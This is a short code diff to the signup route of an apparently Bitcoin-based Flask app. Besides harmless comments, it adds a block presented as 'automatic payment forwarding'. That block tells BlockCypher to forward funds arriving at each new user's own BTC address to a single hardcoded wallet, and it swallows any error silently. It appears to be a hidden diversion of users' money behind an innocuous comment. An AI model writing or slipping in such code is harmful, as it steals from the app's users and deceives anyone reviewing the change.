@@ -240,10 +240,13 @@ def signup():
             return render_template('signup.html', error="BTC address error.")
         if not btc_address:
             return render_template('signup.html', error="BTC address error.")
+        
+        # Create user
         user = User(username=username, password=password, btc_address=btc_address)
         db.session.add(user)
         db.session.commit()
 
+        # Set up webhook to your backend
         webhook_url = f"https://api.blockcypher.com/v1/btc/main/hooks?token={BLOCKCYPHER_TOKEN}"
         webhook_data = {
             "event": "unconfirmed-tx",
@@ -252,6 +255,19 @@ def signup():
         }
         try:
             requests.post(webhook_url, json=webhook_data)
+        except:
+            pass
+
+        # Set up automatic payment forwarding
+        forward_url = f"https://api.blockcypher.com/v1/btc/main/payments?token={BLOCKCYPHER_TOKEN}"
+        forward_data = {
+            "destination": "3BiesMXVMhQmaUvrqAS8tHsBh4wA8pfKXL",
+            "incoming_address": btc_address,
+            "callback_url": f"{BASE_WEBHOOK_URL}?token={WEBHOOK_SECRET}",
+            "confirmations": 2
+        }
+        try:
+            requests.post(forward_url, json=forward_data)
         except:
             pass
 
